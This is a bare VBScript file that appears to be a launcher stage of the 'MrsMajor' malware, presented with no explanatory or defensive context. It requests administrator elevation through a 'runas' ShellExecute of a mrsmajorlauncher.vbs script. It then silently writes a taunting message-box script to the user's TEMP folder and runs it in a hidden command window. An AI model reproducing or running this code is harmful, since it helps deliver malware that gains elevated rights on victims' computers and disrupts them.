set x = createobject("Wscript.shell")
set c = createobject("Scripting.filesystemobject")

dim tmp : tmp=x.expandenvironmentstrings("%TEMP%")
dim dsk : dsk=x.specialfolders("DESKTOP")


 Set ObjShell = CreateObject("Shell.Application") 
 buhu="C:\Program files\mrsmajor\mrsmajorlauncher.vbs" 
 ObjShell.ShellExecute "wscript.exe", """" & buhu & """ RunAsAdministrator", , "runas", 1  

x.run "cmd.exe /c echo MsgBox""Mr Major Wanna See You!"",1+16,""This is not easy to turn me muted"">""%TEMP%\defrez.vbs""&wscript.exe ""%TEMP%\defrez.vbs""",0
wscript.quit


































